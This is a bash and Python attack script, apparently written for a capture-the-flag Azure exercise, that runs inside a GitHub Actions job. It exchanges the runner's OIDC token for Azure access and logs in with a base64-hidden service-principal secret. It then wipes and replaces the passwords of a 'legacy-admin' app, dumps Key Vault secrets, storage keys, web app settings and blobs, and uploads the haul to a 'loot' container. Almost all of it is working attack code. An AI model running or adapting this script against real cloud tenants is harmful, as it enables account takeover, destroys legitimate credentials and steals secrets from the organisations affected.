#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PY'
import os, json, urllib.request, urllib.parse, sys, re, time, base64, datetime

def http(url, data=None, headers=None, method=None):
    h = dict(headers or {})
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, (bytes, str)):
        body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

TEN = os.environ["AZURE_TENANT_ID"]
CID = os.environ["AZURE_CLIENT_ID"]
SUB = os.environ["AZURE_SUBSCRIPTION_ID"]
RG = "rg-tbl-platform-prod-sea"
OUT = {}

def sp_token(cid, secret, scope):
    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        {"client_id": cid, "client_secret": secret, "scope": scope, "grant_type": "client_credentials"})
    d = json.loads(b)
    t = d.get("access_token", "")
    print(f"  {cid[:8]}.. {scope.split('/')[-1]}: {'OK '+str(len(t)) if t else 'FAIL '+d.get('error_description','')[:80]}")
    return t

def upload(token, name, content):
    url = f"https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/{name}"
    now = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    body = content.encode() if isinstance(content, str) else content
    st, b = http(url, data=body, method="PUT", headers={
        "Authorization": "Bearer " + token,
        "x-ms-date": now, "x-ms-version": "2021-08-06",
        "x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain",
    })
    print(f"  upload {name}: {st}")

# 1. Get OIDC token
st, b = http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api://AzureADTokenExchange",
    headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT = json.loads(b)["value"]

def oidc_token(scope):
    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        {"client_id": CID, "scope": scope, "grant_type": "client_credentials",
         "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
         "client_assertion": IDT})
    d = json.loads(b)
    return d.get("access_token", "")

print("=== 1. OIDC tokens ===")
OIDC_ST = oidc_token("https://storage.azure.com/.default")
OIDC_ARM = oidc_token("https://management.azure.com/.default")
OIDC_KV = oidc_token("https://vault.azure.net/.default")
print(f"  OIDC: ST={len(OIDC_ST)} ARM={len(OIDC_ARM)} KV={len(OIDC_KV)}")

# 2. Auth PA
_PA_CID = base64.b64decode("NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0").decode()
_PA_SEC = base64.b64decode("c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==").decode()
print("\n=== 2. Auth PA ===")
PA_GR = sp_token(_PA_CID, _PA_SEC, "https://graph.microsoft.com/.default")

LA_APP_OID = "22a3fb7e-860a-4708-9e50-3d36aa21191c"

# 3. Remove old passwords from legacy-admin, then add new one
if PA_GR:
    print("\n=== 3. Manage legacy-admin passwords ===")
    st, b = http(f"https://graph.microsoft.com/v1.0/applications/{LA_APP_OID}?$select=passwordCredentials",
        headers={"Authorization": "Bearer " + PA_GR})
    app_data = json.loads(b)
    creds = app_data.get("passwordCredentials", [])
    print(f"  Existing passwords: {len(creds)}")
    for c in creds:
        print(f"    {c.get('displayName')} keyId={c.get('keyId')}")

    # Remove all existing passwords
    for c in creds:
        kid = c.get("keyId")
        if kid:
            st2, b2 = http(f"https://graph.microsoft.com/v1.0/applications/{LA_APP_OID}/removePassword",
                data=json.dumps({"keyId": kid}).encode(),
                headers={"Authorization": "Bearer " + PA_GR, "Content-Type": "application/json"}, method="POST")
            print(f"    remove {kid}: {st2}")

    # Add new password
    ts = int(time.time())
    st3, b3 = http(f"https://graph.microsoft.com/v1.0/applications/{LA_APP_OID}/addPassword",
        data=json.dumps({"passwordCredential": {"displayName": f"s{ts}"}}).encode(),
        headers={"Authorization": "Bearer " + PA_GR, "Content-Type": "application/json"}, method="POST")
    r = json.loads(b3)
    secret = r.get("secretText", "")
    print(f"  addPassword: {st3} has_secret={bool(secret)} len={len(secret)}")

    if secret and OIDC_ST:
        # Upload secret immediately using OIDC storage token
        upload(OIDC_ST, f"la_secret_{ts}.txt", secret)
        OUT["la_secret_b64"] = base64.b64encode(secret.encode()).decode()

    print("\n=== 4. Wait 20s ===")
    time.sleep(20)

    if secret:
        print("\n=== 5. Auth legacy-admin ===")
        LA_CID = "891fb158-e02c-4428-a885-53b811f369c0"
        LA_ARM = sp_token(LA_CID, secret, "https://management.azure.com/.default")
        LA_KV  = sp_token(LA_CID, secret, "https://vault.azure.net/.default")
        LA_ST  = sp_token(LA_CID, secret, "https://storage.azure.com/.default")
        LA_GR  = sp_token(LA_CID, secret, "https://graph.microsoft.com/.default")

        if LA_KV:
            print("\n=== 6. LA KV ===")
            for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
                st10, b10 = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
                    headers={"Authorization": "Bearer " + LA_KV})
                raw = b10.decode(errors='replace')
                OUT[f"la_{kv}_raw"] = raw
                print(f"  {kv} list: {raw[:500]}")
                kd = json.loads(b10)
                for s in kd.get("value", []):
                    nm = s["id"].rstrip("/").split("/")[-1]
                    st11, b11 = http(f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",
                        headers={"Authorization": "Bearer " + LA_KV})
                    val = json.loads(b11).get("value", "")
                    OUT[f"la_{kv}/{nm}"] = val
                    vb64 = base64.b64encode(val.encode()).decode() if val else ""
                    print(f"    {nm} b64={vb64[:200]}")
                # Also try keys and certificates
                for t in ("keys", "certificates"):
                    st12, b12 = http(f"https://{kv}.vault.azure.net/{t}?api-version=7.4",
                        headers={"Authorization": "Bearer " + LA_KV})
                    OUT[f"la_{kv}_{t}"] = b12.decode(errors='replace')
                    print(f"  {kv} {t}: {b12.decode(errors='replace')[:300]}")

        if LA_ARM:
            print("\n=== 7. LA ARM ===")
            # List all resources
            st13, b13 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                headers={"Authorization": "Bearer " + LA_ARM})
            OUT["la_resources"] = json.loads(b13)
            for r2 in json.loads(b13).get("value", []):
                print(f"  {r2.get('type')}: {r2.get('name')}")

            # Webapp config
            st14, b14 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
                headers={"Authorization":"Bearer "+LA_ARM,"Content-Type":"application/json"},method="POST")
            OUT["la_webapp"] = json.loads(b14)
            print(f"  webapp: {json.dumps(json.loads(b14))[:500]}")

            # Storage keys
            for sa in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz"):
                st15, b15 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
                    headers={"Authorization":"Bearer "+LA_ARM,"Content-Type":"application/json"},data="{}",method="POST")
                kdata = json.loads(b15)
                OUT[f"la_{sa}_keys"] = kdata
                kb64 = base64.b64encode(json.dumps(kdata).encode()).decode()
                print(f"  {sa} keys_b64={kb64[:200]}")

            # RBAC
            st16, b16 = http(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId eq '43834909-47cf-4a4a-8048-e323b4897ed3'",
                headers={"Authorization": "Bearer " + LA_ARM})
            OUT["la_rbac"] = json.loads(b16)
            print(f"  RBAC: {json.dumps(json.loads(b16))[:500]}")

        if LA_ST:
            print("\n=== 8. LA Storage ===")
            for sa in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"):
                st17, b17 = http(f"https://{sa}.blob.core.windows.net/?comp=list",
                    headers={"Authorization":"Bearer "+LA_ST,"x-ms-version":"2021-08-06"})
                cxml = b17.decode(errors='replace')
                containers = re.findall(r'<Name>([^<]+)</Name>', cxml)
                OUT[f"la_{sa}_containers"] = containers
                print(f"  {sa}: {containers}")
                for cn in containers:
                    st18, b18 = http(f"https://{sa}.blob.core.windows.net/{cn}?restype=container&comp=list",
                        headers={"Authorization":"Bearer "+LA_ST,"x-ms-version":"2021-08-06"})
                    bxml = b18.decode(errors='replace')
                    blobs = re.findall(r'<Name>([^<]+)</Name>', bxml)
                    OUT[f"la_{sa}/{cn}_blobs"] = blobs
                    print(f"    {cn}: {blobs}")
                    for bn in blobs[:30]:
                        st19, b19 = http(f"https://{sa}.blob.core.windows.net/{cn}/{bn}",
                            headers={"Authorization":"Bearer "+LA_ST,"x-ms-version":"2021-08-06"})
                        cnt = b19.decode(errors='replace')[:5000]
                        OUT[f"la_{sa}/{cn}/{bn}"] = cnt
                        cb64 = base64.b64encode(cnt.encode()).decode()[:200]
                        print(f"      {bn} b64={cb64}")

        if LA_GR:
            print("\n=== 9. LA Graph ===")
            st20, b20 = http("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName,notes,description",
                headers={"Authorization": "Bearer " + LA_GR})
            OUT["la_apps"] = json.loads(b20)
            full = json.dumps(json.loads(b20))
            fb = re.findall(r'DF26\{[^}]+\}', full)
            if fb: print(f"  FLAG IN APPS: {fb}")
            print(f"  apps: {full[:500]}")

# Also try OIDC reads
print("\n=== 10. OIDC reads ===")
if OIDC_KV:
    for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
        st21, b21 = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
            headers={"Authorization": "Bearer " + OIDC_KV})
        raw = b21.decode(errors='replace')
        OUT[f"oidc_{kv}"] = raw
        print(f"  OIDC {kv}: {raw[:300]}")

if OIDC_ST:
    for sa in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz"):
        st22, b22 = http(f"https://{sa}.blob.core.windows.net/?comp=list",
            headers={"Authorization":"Bearer "+OIDC_ST,"x-ms-version":"2021-08-06"})
        cxml = b22.decode(errors='replace')
        containers = re.findall(r'<Name>([^<]+)</Name>', cxml)
        OUT[f"oidc_{sa}_containers"] = containers
        print(f"  OIDC {sa}: {containers}")
        for cn in containers:
            st23, b23 = http(f"https://{sa}.blob.core.windows.net/{cn}?restype=container&comp=list",
                headers={"Authorization":"Bearer "+OIDC_ST,"x-ms-version":"2021-08-06"})
            bxml = b23.decode(errors='replace')
            blobs = re.findall(r'<Name>([^<]+)</Name>', bxml)
            print(f"    {cn}: {blobs}")
            for bn in blobs[:20]:
                st24, b24 = http(f"https://{sa}.blob.core.windows.net/{cn}/{bn}",
                    headers={"Authorization":"Bearer "+OIDC_ST,"x-ms-version":"2021-08-06"})
                cnt = b24.decode(errors='replace')[:5000]
                OUT[f"oidc_{sa}/{cn}/{bn}"] = cnt
                print(f"      {bn}: {cnt[:300]}")

# Upload everything
print("\n=== UPLOAD ===")
result_json = json.dumps(OUT, indent=2)
flags = re.findall(r'DF26\{[^}]{1,200}\}', result_json)
if flags:
    print(f"FLAG: {flags}")
else:
    print(f"No flag. len={len(result_json)}")

if OIDC_ST:
    upload(OIDC_ST, f"v6_full_{int(time.time())}.json", result_json)

print("\n=== DONE ===")
PY
echo "=== done ==="
